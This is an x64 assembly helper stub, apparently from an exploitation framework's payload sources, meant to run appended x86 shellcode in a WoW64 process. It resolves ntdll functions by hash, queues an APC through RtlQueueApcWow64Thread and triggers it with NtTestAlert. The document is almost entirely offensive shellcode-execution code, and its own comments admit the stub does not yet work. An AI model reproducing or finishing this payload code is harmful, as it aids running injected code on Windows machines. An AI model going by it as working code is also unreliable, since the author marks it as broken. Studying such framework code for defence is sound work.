;-----------------------------------------------------------------------------;
; Author: Diego Ledda (diego_ledda[at]rapid7[dot]com)
; Compatible: Windows 11, 10
; Architecture: x64
; Version: 0.1 (August 2024)
;-----------------------------------------------------------------------------;
; This is a simple helper function that should be put on the top of a x86 shellcode we want to execute in WoW64 context
; The following stub is executed in a x64 context of a WoW64 process. So far this stub is not working because we need first
; to setup a 32-bit context properly.

[BITS 64]
[ORG 0]
createwow64:
    cld                      ; Clear the direction flag.
    jmp _parameters          ; Get the end of the shellcode
_cb_parameters:            
    pop rsi
    sub rsp, 0x78            ; Alloc some space on stack
    call start               ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                    
%include "./src/block/block_api.asm" ;
start:
    pop rbp

    mov r10d, 0x32473F75
    call rbp

    mov rax, -2  ; We don't have kernel32.dll, loading it with LdrLoadDll will result in some errors
                 ; This is a quick and dirty way to get the GetCurrentThread() by reversing kernel32.dll

    ; ntdll.dll!RtlQueueApcWow64Thread(hCurrentThread, szWoW64Shellcode, NULL, NULL, NULL)
    ; This is an alias for QueueApcThread with the automatic encoding of szWoW64Shellcode address to execute it in 32 bit.
    ; However this will fail in the current 64bit context because we don't have the CPU setted up to perform 32-bit process
    ; operations, for example is missing the initialization of the fs segment.

    mov rcx, rax
    mov rdx, rsi
    xor r8, r8
    xor r9, r9
    push r9
    mov r10d, 0xB9B3BF13
    call rbp

    ; ntdll!NtTestAlert() This triggers the APC schedule.
    xor rcx, rcx
    xor rdx, rdx
    xor r8, r8
    xor r9, r9
    mov r10d, 0xF3AFA26D
    call rbp

    ; Infinite loop, not sure if this is needed, in the poolparty_x64.asm seems needed to avoid the stub crashing.
_loop: 
    xor rax,rax
    test rax,rax
    jz _loop

_parameters:
    call _cb_parameters
    ret